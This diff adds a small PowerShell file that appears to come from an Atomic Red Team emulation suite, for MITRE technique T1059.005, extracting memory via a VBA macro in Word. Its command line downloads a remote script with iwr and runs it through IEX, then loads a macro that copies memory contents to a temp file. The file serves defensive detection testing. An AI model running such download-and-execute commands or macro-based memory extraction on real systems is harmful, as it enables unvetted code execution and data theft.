@@ -1,0 +1,17 @@
+#TechniqueName: Command and Scripting Interpreter: Visual Basic
+#AtomicTestName: Extract Memory via VBA
+#Description: This module attempts to emulate malware authors utilizing well known techniques to extract data from memory/binary files. To do this&we first create a string in memory then pull out the pointer to that string. Finally, it uses this pointer to copy the contents of that&memory location to a file stored in the $env:TEMP\atomic_t1059_005_test_output.bin.&
+#Language: ps1
+
+#get_prereq_commands
+Write-Host "You will need to install Microsoft Word manually to meet this requirement"
+
+
+#commands
+IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1") 
+Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1059.005\src\T1059_005-macrocode.txt" -officeProduct "Word" -sub "Extract"
+
+
+#cleanup_commands
+Remove-Item "$env:TEMP\atomic_t1059_005_test_output.bin" -ErrorAction Ignore
+
